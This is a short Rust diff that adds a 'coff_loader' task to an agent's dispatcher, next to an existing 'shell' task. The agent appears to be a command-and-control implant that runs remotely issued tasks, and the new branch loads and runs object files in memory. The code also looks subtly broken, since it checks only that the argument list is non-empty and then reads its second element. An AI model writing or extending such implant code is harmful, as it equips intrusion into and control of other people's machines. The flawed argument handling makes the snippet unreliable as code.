@@ -140,6 +140,26 @@ impl<T: Transport, E: CommandExecutor> Agent<T, E> {
                 String::new()
             }
 
+            "coff_loader" => {
+                let args = match task.coff_args {
+                    Some(ref v) if !v.is_empty() => v.clone(),
+                    _ => {
+                        warn!("coff_loader task received with no coff_args");
+                        return "coff_loader task has no coff_args".into();
+                    }
+                };
+
+                let first = match std::ffi::CString::new(args[1].as_str()) {
+                    Ok(c) => c,
+                    Err(e) => {
+                        return format!("coff_loader invalid arg {:?}: {e}", args[1]);
+                    }
+                };
+
+                CoffLoader2::run(first);
+                String::from("COFF loader executed")
+            }
+
             "shell" => {
                 let command =
                     match task.command {
